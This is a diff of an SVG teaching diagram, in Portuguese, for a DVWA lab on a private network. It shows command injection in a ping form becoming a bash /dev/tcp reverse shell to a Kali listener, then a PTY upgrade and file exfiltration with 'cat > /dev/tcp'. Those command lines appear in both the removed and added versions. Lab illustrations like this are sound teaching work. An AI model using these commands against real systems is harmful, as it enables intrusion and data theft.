@@ -1,76 +1,138 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 470" role="img" aria-labelledby="t d">
-  <title id="t">Da injeção de comando ao shell interativo e à exfiltração</title>
-  <desc id="d">A cadeia do laboratório, em cinco etapas ligadas por setas. Etapa 1: no Kali, o atacante sobe um listener com netcat, que fica à escuta numa porta, por exemplo a 4444. Etapa 2: o atacante usa a injeção de comando no formulário de ping do DVWA para rodar um comando como o usuário www-data no servidor. Etapa 3: o comando injetado é um reverse shell com bash e /dev/tcp, que faz o DVWA conectar de volta ao listener do Kali pela rede interna lab_net; nasce um shell, mas é um shell burro, sem Ctrl-C nem tab nem eco de senha. Etapa 4: o atacante melhora o shell com o comando script, que aloca um pseudo-terminal, e passa a ter um shell quase completo. Etapa 5: com o shell, o atacante lê e transfere arquivos do alvo de volta ao Kali, por exemplo com cat e /dev/tcp caindo num listener do netcat, e confere a integridade com sha256. A lição: uma injeção de comando, que dá um comando de cada vez, vira controle interativo e contínuo do alvo.</desc>
-  <style>
-    text { font-family: ui-monospace, "DejaVu Sans Mono", Menlo, Consolas, monospace; fill: #e6ede8; }
-    .t { font-size: 16px; font-weight: 700; }
-    .h { font-size: 12.5px; font-weight: 700; fill: #5cc8d8; }
-    .b { font-size: 12px; }
-    .c { font-size: 11px; fill: #5ee08a; }
-    .s { font-size: 10.5px; fill: #9fb0a6; }
-    .n { font-size: 13px; font-weight: 700; fill: #e8c46a; }
-    .ln { stroke: #3a4b42; stroke-width: 2; }
-    .fl { stroke: #5ee08a; stroke-width: 2.5; }
-  </style>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1300 800" width="1300" height="800" data-generator="fireworks-tech-graph" data-schema-version="1" data-text-metrics="heuristic-v1" data-style-id="2" data-visual-theme="Dark Terminal" data-diagram-type="architecture" data-motion-scene="" data-semantic-profile="generic" data-semantic-valid="true" data-quality-profile="standard" data-max-bends-per-edge="12" data-max-total-bends="100" data-max-route-stretch="5.0" data-max-bridged-crossings="8" data-min-node-gap="0.0" data-min-container-gutter="0.0" data-min-label-clearance="2.0" data-min-segment-length="0.0">
   <defs>
-    <marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#5ee08a"/></marker>
+    <marker id="arrowA" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#a855f7"/>
+    </marker>
+    <marker id="arrowB" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#22c55e"/>
+    </marker>
+    <marker id="arrowC" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#38bdf8"/>
+    </marker>
+    <marker id="arrowE" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#fb7185"/>
+    </marker>
+    <marker id="arrowF" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#f59e0b"/>
+    </marker>
+    <marker id="arrowG" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#f97316"/>
+    </marker>
+    <marker id="arrowH" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#94a3b8"/>
+    </marker>
+    <linearGradient id="terminalGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#0f0f1a"/>
+      <stop offset="100%" stop-color="#1a1a2e"/>
+    </linearGradient>
+    <filter id="glowBlue" x="-30%" y="-30%" width="160%" height="160%">
+      <feDropShadow dx="0" dy="0" stdDeviation="5" flood-color="#3b82f6" flood-opacity="0.65"/>
+    </filter>
+    <filter id="glowPurple" x="-30%" y="-30%" width="160%" height="160%">
+      <feDropShadow dx="0" dy="0" stdDeviation="5" flood-color="#a855f7" flood-opacity="0.72"/>
+    </filter>
+    <filter id="glowGreen" x="-30%" y="-30%" width="160%" height="160%">
+      <feDropShadow dx="0" dy="0" stdDeviation="5" flood-color="#22c55e" flood-opacity="0.62"/>
+    </filter>
+    <filter id="glowOrange" x="-30%" y="-30%" width="160%" height="160%">
+      <feDropShadow dx="0" dy="0" stdDeviation="5" flood-color="#f97316" flood-opacity="0.62"/>
+    </filter>
+    <style>
+    text { font-family: 'SF Mono', 'Fira Code', Menlo, 'Noto Sans CJK SC', 'Microsoft YaHei', 'SimHei', monospace; }
+    .title { font-size: 30px; font-weight: 700; fill: #e2e8f0; }
+    .subtitle { font-size: 14px; font-weight: 500; fill: #94a3b8; }
+    .section { font-size: 13px; font-weight: 700; fill: #38bdf8; letter-spacing: 1.4px; }
+    .section-sub { font-size: 12px; font-weight: 500; fill: #94a3b8; }
+    .node-title { font-weight: 700; fill: #e2e8f0; }
+    .node-sub { font-weight: 500; fill: #94a3b8; }
+    .node-type { font-size: 12px; font-weight: 700; fill: #94a3b8; letter-spacing: 0.08em; }
+    .arrow-label { font-size: 12px; font-weight: 600; fill: #cbd5e1; }
+    .legend { font-size: 12px; font-weight: 500; fill: #94a3b8; }
+    .footnote { font-size: 12px; font-weight: 500; fill: #94a3b8; }
+    .metric-label { font-size: 8.5px; font-weight: 700; fill: #94a3b8; text-transform: uppercase; }
+    .metric-value { font-size: 9.5px; font-weight: 700; fill: #e2e8f0; }
+    </style>
   </defs>
-  <rect width="900" height="470" fill="#121815"/>
-  <text class="t" x="30" y="34">Uma injeção de comando vira controle interativo do alvo</text>
-
-  <!-- Kali side -->
-  <rect x="20" y="58" width="250" height="372" rx="10" fill="#16201b" stroke="#5ee08a"/>
-  <text class="h" x="36" y="84">Kali  (atacante, 10.0.0.2)</text>
-
-  <!-- DVWA side -->
-  <rect x="630" y="58" width="250" height="372" rx="10" fill="#16201b" stroke="#2c3a33"/>
-  <text class="h" x="646" y="84">DVWA  (alvo, 10.0.0.3)</text>
-  <text class="s" x="646" y="102">processo web: www-data</text>
-
-  <!-- step 1 -->
-  <text class="n" x="36" y="130">1</text>
-  <rect x="54" y="114" width="200" height="46" rx="8" fill="#1d2a23" stroke="#5ee08a"/>
-  <text class="b" x="66" y="134">listener</text>
-  <text class="c" x="66" y="151">nc -lvnp 4444</text>
-
-  <!-- step 2 -->
-  <text class="n" x="300" y="130">2</text>
-  <rect x="320" y="110" width="290" height="54" rx="8" fill="#1d2a23" stroke="#e8c46a"/>
-  <text class="b" x="332" y="130">injeção de comando (form de ping)</text>
-  <text class="s" x="332" y="150">127.0.0.1 ; &lt;comando&gt;  → roda como www-data</text>
-  <line class="ln" x1="254" y1="137" x2="320" y2="137" marker-end="url(#a)"/>
-
-  <!-- step 3 -->
-  <text class="n" x="300" y="210">3</text>
-  <rect x="320" y="190" width="290" height="58" rx="8" fill="#1d2a23" stroke="#2c3a33"/>
-  <text class="b" x="332" y="210">reverse shell injetado</text>
-  <text class="c" x="332" y="228">bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1</text>
-  <text class="s" x="332" y="243">o alvo liga de volta pela lab_net</text>
-  <!-- connect back arrow (DVWA -> Kali) -->
-  <line class="fl" x1="320" y1="219" x2="254" y2="170" marker-end="url(#a)"/>
-  <text class="s g" x="150" y="186">shell burro</text>
-
-  <!-- step 4 -->
-  <text class="n" x="36" y="300">4</text>
-  <rect x="54" y="280" width="200" height="58" rx="8" fill="#1d2a23" stroke="#5ee08a"/>
-  <text class="b" x="66" y="300">upgrade p/ PTY</text>
-  <text class="c" x="66" y="318">script -qc /bin/bash</text>
-  <text class="s" x="66" y="333">Ctrl-C, tab, sem eco de senha</text>
-
-  <!-- step 5 -->
-  <text class="n" x="36" y="382">5</text>
-  <rect x="54" y="362" width="200" height="54" rx="8" fill="#1d2a23" stroke="#5ee08a"/>
-  <text class="b" x="66" y="382">exfiltra arquivo</text>
-  <text class="c" x="66" y="400">nc -lvnp 4445 &gt; loot</text>
-  <text class="s" x="66" y="414">confere com sha256sum</text>
-
-  <rect x="320" y="300" width="290" height="116" rx="8" fill="#16201b" stroke="#2c3a33"/>
-  <text class="s" x="336" y="324">o alvo só tem bash, perl, php e curl;</text>
-  <text class="s" x="336" y="342">NÃO tem nc nem python3. Por isso</text>
-  <text class="s" x="336" y="360">o canal usa bash /dev/tcp, e a</text>
-  <text class="s" x="336" y="378">transferência manda com</text>
-  <text class="c" x="336" y="396">cat arquivo &gt; /dev/tcp/10.0.0.2/4445</text>
-  <text class="s" x="336" y="412">caindo no listener do Kali (etapa 5).</text>
-
-  <text class="s" x="30" y="452">As setas verdes são conexões que partem do alvo para o Kali: é por elas que o reverse shell e a exfiltração passam.</text>
+  <rect data-graph-role="background" width="1300.0" height="800.0" fill="url(#terminalGradient)"/>
+  <circle cx="20.0" cy="20" r="5.5" fill="#ef4444"/>
+  <circle cx="38.0" cy="20" r="5.5" fill="#f59e0b"/>
+  <circle cx="56.0" cy="20" r="5.5" fill="#10b981"/>
+  <text x="650.0" y="56" text-anchor="middle" class="title">Uma injeção de comando vira controle interativo do alvo</text>
+  <text x="650.0" y="82" text-anchor="middle" class="subtitle">o momento-chave: o alvo liga de volta para o Kali, e um comando por vez vira um shell</text>
+  <g id="kali" data-graph-role="container" data-container-id="kali" data-semantic-role="boundary" data-graph-bounds="40,120,560,680">
+  <rect data-graph-role="container" x="40.0" y="120.0" width="520.0" height="560.0" rx="16.0" fill="rgba(15,23,42,0.28)" stroke="#334155" stroke-width="1.4" stroke-dasharray="7 6"/>
+  <text x="58.0" y="144.0" class="section">KALI (atacante, 10.0.0.2)</text>
+    <rect id="kali-header" data-graph-role="reserved" data-reserved-kind="container-header" x="48" y="126" width="195.88" height="30" fill="none" stroke="none"/>
+  </g>
+  <g id="dvwa" data-graph-role="container" data-container-id="dvwa" data-semantic-role="boundary" data-graph-bounds="780,120,1260,520">
+  <rect data-graph-role="container" x="780.0" y="120.0" width="480.0" height="400.0" rx="16.0" fill="rgba(15,23,42,0.28)" stroke="#334155" stroke-width="1.4" stroke-dasharray="7 6"/>
+  <text x="798.0" y="144.0" class="section">DVWA (alvo, 10.0.0.3)</text>
+    <rect id="dvwa-header" data-graph-role="reserved" data-reserved-kind="container-header" x="788" y="126" width="168.84" height="30" fill="none" stroke="none"/>
+  </g>
+  <path id="e3" data-graph-role="edge" data-edge-id="e3" data-source="bash" data-target="lis" data-edge-kind="flow" data-topic-id="" data-flow="" data-motion-role="" data-motion-stage="" data-motion-order="" data-protocol="" data-via="" data-critical-path-id="" data-critical-hop="" data-critical-hops="" data-critical="false" data-bends="2" data-route-stretch="1.0" data-bridges="" d="M 820,420 L 670,420 L 670,230 L 480,230" fill="none" stroke="#22c55e" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" marker-end="url(#arrowB)"/>
+  <path id="e5" data-graph-role="edge" data-edge-id="e5" data-source="bash" data-target="loot" data-edge-kind="flow" data-topic-id="" data-flow="" data-motion-role="" data-motion-stage="" data-motion-order="" data-protocol="" data-via="" data-critical-path-id="" data-critical-hop="" data-critical-hops="" data-critical="false" data-bends="1" data-route-stretch="1.0" data-bridges="" d="M 1020,480 L 1020,590 L 480,590" fill="none" stroke="#22c55e" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" marker-end="url(#arrowB)"/>
+  <path id="e2" data-graph-role="edge" data-edge-id="e2" data-source="inj" data-target="bash" data-edge-kind="flow" data-topic-id="" data-flow="" data-motion-role="" data-motion-stage="" data-motion-order="" data-protocol="" data-via="" data-critical-path-id="" data-critical-hop="" data-critical-hops="" data-critical="false" data-bends="0" data-route-stretch="1.0" data-bridges="" d="M 1020,290 L 1020,360" fill="none" stroke="#38bdf8" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" marker-end="url(#arrowC)"/>
+  <path id="e4" data-graph-role="edge" data-edge-id="e4" data-source="lis" data-target="pty" data-edge-kind="flow" data-topic-id="" data-flow="" data-motion-role="" data-motion-stage="" data-motion-order="" data-protocol="" data-via="" data-critical-path-id="" data-critical-hop="" data-critical-hops="" data-critical="false" data-bends="0" data-route-stretch="1.0" data-bridges="" d="M 280,290 L 280,360" fill="none" stroke="#94a3b8" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" marker-end="url(#arrowH)"/>
+  <g id="node-lis" data-graph-role="node" data-node-id="lis" data-semantic-role="node" data-motion-role="" data-motion-stage="" data-motion-order="" data-parent="kali" data-deployment-id="" data-topic-id="" data-span-id="" data-station-order="" data-status="" data-start-ms="" data-duration-ms="" data-parent-span="" data-graph-bounds="80,170,480,290">
+  <rect x="80.0" y="170.0" width="400.0" height="120.0" rx="10.0" fill="#0f172a" stroke="#64748b" stroke-width="1.8"/>
+  <text x="280.0" y="188.0" text-anchor="middle" class="node-type">PASSO 1</text>
+  <text data-text-role="title" data-full-text="Listener à espera" data-text-max-width="376.0" x="280.0" y="236.0" text-anchor="middle" class="node-title" font-size="18">Listener à espera</text>
+  <text data-text-role="subtitle" data-full-text="nc -lvnp 4444" data-text-max-width="376.0" x="280.0" y="258.0" text-anchor="middle" class="node-sub" font-size="12">nc -lvnp 4444</text>
+  </g>
+  <g id="node-inj" data-graph-role="node" data-node-id="inj" data-semantic-role="node" data-motion-role="" data-motion-stage="" data-motion-order="" data-parent="dvwa" data-deployment-id="" data-topic-id="" data-span-id="" data-station-order="" data-status="" data-start-ms="" data-duration-ms="" data-parent-span="" data-graph-bounds="820,170,1220,290">
+  <rect x="820.0" y="170.0" width="400.0" height="120.0" rx="10.0" fill="#0f172a" stroke="#38bdf8" stroke-width="1.8"/>
+  <text x="1020.0" y="188.0" text-anchor="middle" class="node-type">PASSO 2</text>
+  <text data-text-role="title" data-full-text="Injeção no formulário de ping" data-text-max-width="376.0" x="1020.0" y="236.0" text-anchor="middle" class="node-title" font-size="18">Injeção no formulário de ping</text>
+  <text data-text-role="subtitle" data-full-text="o comando roda como www-data" data-text-max-width="376.0" x="1020.0" y="258.0" text-anchor="middle" class="node-sub" font-size="12">o comando roda como www-data</text>
+  </g>
+  <g id="node-bash" data-graph-role="node" data-node-id="bash" data-semantic-role="node" data-motion-role="" data-motion-stage="" data-motion-order="" data-parent="dvwa" data-deployment-id="" data-topic-id="" data-span-id="" data-station-order="" data-status="" data-start-ms="" data-duration-ms="" data-parent-span="" data-graph-bounds="820,360,1220,480">
+  <rect x="820.0" y="360.0" width="400.0" height="120.0" rx="10.0" fill="#2a1f05" stroke="#f59e0b" stroke-width="2.6" filter="url(#glowOrange)"/>
+  <text x="1020.0" y="378.0" text-anchor="middle" class="node-type">PASSO 3 · O MOMENTO-CHAVE</text>
+  <text data-text-role="title" data-full-text="O alvo liga de volta" data-text-max-width="376.0" x="1020.0" y="426.0" text-anchor="middle" class="node-title" font-size="18">O alvo liga de volta</text>
+  <text data-text-role="subtitle" data-full-text="bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444" data-text-max-width="376.0" x="1020.0" y="448.0" text-anchor="middle" class="node-sub" font-size="12">bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444</text>
+  </g>
+  <g id="node-pty" data-graph-role="node" data-node-id="pty" data-semantic-role="node" data-motion-role="" data-motion-stage="" data-motion-order="" data-parent="kali" data-deployment-id="" data-topic-id="" data-span-id="" data-station-order="" data-status="" data-start-ms="" data-duration-ms="" data-parent-span="" data-graph-bounds="80,360,480,480">
+  <rect x="80.0" y="360.0" width="400.0" height="120.0" rx="10.0" fill="#0f172a" stroke="#64748b" stroke-width="1.8"/>
+  <text x="280.0" y="378.0" text-anchor="middle" class="node-type">PASSO 4</text>
+  <text data-text-role="title" data-full-text="Shell completo (PTY)" data-text-max-width="376.0" x="280.0" y="426.0" text-anchor="middle" class="node-title" font-size="18">Shell completo (PTY)</text>
+  <text data-text-role="subtitle" data-full-text="upgrade com script: Ctrl-C, tab, senha oculta" data-text-max-width="376.0" x="280.0" y="448.0" text-anchor="middle" class="node-sub" font-size="12">upgrade com script: Ctrl-C, tab, senha oculta</text>
+  </g>
+  <g id="node-loot" data-graph-role="node" data-node-id="loot" data-semantic-role="node" data-motion-role="" data-motion-stage="" data-motion-order="" data-parent="kali" data-deployment-id="" data-topic-id="" data-span-id="" data-station-order="" data-status="" data-start-ms="" data-duration-ms="" data-parent-span="" data-graph-bounds="80,530,480,650">
+  <rect x="80.0" y="530.0" width="400.0" height="120.0" rx="10.0" fill="#2a0a12" stroke="#fb7185" stroke-width="2.6"/>
+  <text x="280.0" y="548.0" text-anchor="middle" class="node-type">PASSO 5 · O QUE O ATACANTE GANHA</text>
+  <text data-text-role="title" data-full-text="Arquivo do alvo no Kali" data-text-max-width="376.0" x="280.0" y="596.0" text-anchor="middle" class="node-title" font-size="18">Arquivo do alvo no Kali</text>
+  <text data-text-role="subtitle" data-full-text="integridade conferida com sha256sum" data-text-max-width="376.0" x="280.0" y="618.0" text-anchor="middle" class="node-sub" font-size="12">integridade conferida com sha256sum</text>
+  </g>
+  <g id="e2-label" data-graph-role="label" data-owner="e2" data-graph-bounds="847.16,311,997,331">
+  <rect x="847.16" y="311.0" width="149.84" height="20" rx="6" fill="#0f172a" opacity="0.92"/>
+  <text x="922.08" y="325.0" text-anchor="middle" class="arrow-label">injeta o reverse shell</text>
+  </g>
+  <g id="e3-label" data-graph-role="label" data-owner="e3" data-graph-bounds="546.2,205,667,225">
+  <rect x="546.2" y="205.0" width="120.80000000000001" height="20" rx="6" fill="#0f172a" opacity="0.92"/>
+  <text x="606.6" y="219.0" text-anchor="middle" class="arrow-label">shell burro chega</text>
+  </g>
+  <g id="e4-label" data-graph-role="label" data-owner="e4" data-graph-bounds="153.24,311,257,331">
+  <rect x="153.24" y="311.0" width="103.76000000000002" height="20" rx="6" fill="#0f172a" opacity="0.92"/>
+  <text x="205.12" y="325.0" text-anchor="middle" class="arrow-label">melhora o shell</text>
+  </g>
+  <g id="e5-label" data-graph-role="label" data-owner="e5" data-graph-bounds="671.96,559,828.04,579">
+  <rect x="671.96" y="559.0" width="156.08" height="20" rx="6" fill="#0f172a" opacity="0.92"/>
+  <text x="750.0" y="573.0" text-anchor="middle" class="arrow-label">cat arquivo &gt; /dev/tcp</text>
+  </g>
+  <g id="legend" data-graph-role="legend">
+    <rect id="legend-zone" data-graph-role="reserved" data-reserved-kind="legend" x="38" y="701" width="1015.44" height="46" rx="10" fill="none" stroke="none"/>
+    <line data-graph-role="decoration" x1="48.0" y1="715.0" x2="78.0" y2="715.0" stroke="#38bdf8" stroke-width="2.3" marker-end="url(#arrowC)"/>
+    <text data-graph-role="decoration" x="88.0" y="719.0" class="legend">comando do atacante    </text>
+    <line data-graph-role="decoration" x1="260.24" y1="715.0" x2="290.24" y2="715.0" stroke="#22c55e" stroke-width="2.3" marker-end="url(#arrowB)"/>
+    <text data-graph-role="decoration" x="300.24" y="719.0" class="legend">conexão do alvo para o Kali    </text>
+    <line data-graph-role="decoration" x1="510.88" y1="715.0" x2="540.88" y2="715.0" stroke="#f59e0b" stroke-width="2.3" marker-end="url(#arrowF)"/>
+    <text data-graph-role="decoration" x="550.88" y="719.0" class="legend">momento-chave    </text>
+    <line data-graph-role="decoration" x1="686.64" y1="715.0" x2="716.64" y2="715.0" stroke="#94a3b8" stroke-width="2.3" marker-end="url(#arrowH)"/>
+    <text data-graph-role="decoration" x="726.64" y="719.0" class="legend">passo no Kali    </text>
+    <line data-graph-role="decoration" x1="850.88" y1="715.0" x2="880.88" y2="715.0" stroke="#fb7185" stroke-width="2.3" marker-end="url(#arrowE)"/>
+    <text data-graph-role="decoration" x="890.88" y="719.0" class="legend">o que o atacante ganha</text>
+  </g>
+  <g id="footer" data-graph-role="reserved" data-graph-bounds="48,753,720,769">
+  <text x="48.0" y="765.0" class="footnote">O alvo não tem nc nem python3: por isso o canal usa o /dev/tcp do bash e o upgrade usa o script.</text>
+  </g>
 </svg>
